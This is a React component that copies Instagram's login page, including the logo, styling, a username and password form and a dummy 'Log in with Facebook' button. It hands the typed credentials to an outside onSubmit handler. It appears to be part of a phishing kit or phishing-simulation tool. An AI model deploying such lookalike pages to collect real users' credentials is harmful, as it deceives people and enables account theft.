'use client'

import { useState } from 'react'

interface InstagramPageProps {
  onSubmit: (data: { username?: string; password?: string }) => void
}

export function InstagramPage({ onSubmit }: InstagramPageProps) {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    await onSubmit({ username, password })
    setLoading(false)
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
      <div className="w-full max-w-[350px] px-4 py-8">
        {/* Instagram Logo */}
        <div className="flex justify-center mb-8">
          <img src="/insta_logo.png" alt="Instagram" className="h-16 w-auto" />
        </div>

        {/* Login Form Card */}
        <div className="bg-white border border-gray-300 rounded-sm p-8 mb-4">
          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Phone number, username, or email"
                className="w-full px-3 py-2 text-xs bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400"
                style={{ backgroundColor: '#FAFAFA' }}
                required
              />
            </div>
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full px-3 py-2 text-xs bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400"
                style={{ backgroundColor: '#FAFAFA' }}
                required
              />
            </div>
            <button
              type="submit"
              disabled={loading}
              className="w-full py-1.5 text-sm font-semibold text-white rounded-sm disabled:opacity-50 disabled:cursor-not-allowed"
              style={{ backgroundColor: '#0095F6' }}
            >
              {loading ? 'Logging in...' : 'Log in'}
            </button>
          </form>

          {/* Divider with OR */}
          <div className="flex items-center my-4">
            <div className="flex-1 border-t border-gray-300"></div>
            <span className="px-4 text-xs font-semibold text-gray-500 uppercase">OR</span>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          {/* Facebook Login Button */}
          <button
            type="button"
            className="w-full flex items-center justify-center gap-2 py-1.5 mb-4"
          >
            <svg className="w-5 h-5" fill="#1877F2" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            <span className="text-sm font-semibold" style={{ color: '#385185' }}>Log in with Facebook</span>
          </button>

          {/* Forgot Password Link */}
          <div className="text-center">
            <a href="#" className="text-xs" style={{ color: '#00376B' }}>
              Forgot password?
            </a>
          </div>
        </div>
      </div>
    </div>
  )
}

